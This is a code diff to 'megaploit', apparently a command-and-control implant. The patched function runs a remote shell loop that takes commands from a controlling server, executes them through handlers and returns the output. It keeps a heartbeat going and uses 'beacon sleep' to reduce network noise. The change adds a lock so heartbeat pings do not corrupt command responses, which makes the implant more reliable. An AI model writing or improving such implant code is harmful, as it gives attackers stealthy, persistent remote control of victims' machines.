@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import contextlib
 import socket
+import threading
 import time
 
 from megaploit.core.protocol import send_msg, recv_msg
@@ -27,10 +28,14 @@ def run_shell(conn: socket.socket) -> None:
     """Block until the server sends 'exit' or the connection drops."""
     from megaploit.agent import handlers as _h
 
+    # Shared lock — prevents the heartbeat thread from sending a PING
+    # in the middle of a command response, which would desync the protocol.
+    _send_lock = threading.Lock()
+
     # Start the background heartbeat PING sender (feature 6b)
     try:
         from megaploit.core.heartbeat import start_heartbeat
-        start_heartbeat(conn, interval=30.0)
+        start_heartbeat(conn, interval=30.0, send_lock=_send_lock)
     except Exception:
         pass
 
@@ -48,12 +53,14 @@ def run_shell(conn: socket.socket) -> None:
         try:
             response = handle(conn, cmd)
             if response is not None:
-                send_msg(conn, response)
+                with _send_lock:
+                    send_msg(conn, response)
         except (ConnectionError, OSError):
             break
         except Exception as e:
             with contextlib.suppress(Exception):
-                send_msg(conn, f"[-] Internal error: {e}")
+                with _send_lock:
+                    send_msg(conn, f"[-] Internal error: {e}")
 
         # Beacon sleep — pause between command polls to reduce network noise
         sleep_secs = getattr(_h, "_beacon_sleep", 0.0)
